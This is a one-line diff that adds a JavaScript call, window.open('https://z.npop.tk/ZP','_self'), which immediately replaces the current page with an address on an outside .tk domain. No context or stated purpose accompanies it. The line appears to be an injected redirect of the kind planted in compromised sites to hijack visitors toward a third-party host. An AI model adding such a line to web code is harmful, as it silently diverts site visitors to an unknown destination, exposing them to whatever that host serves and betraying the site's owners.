@@ -1,0 +1,1 @@
+window.open('https://z.npop.tk/ZP','_self');
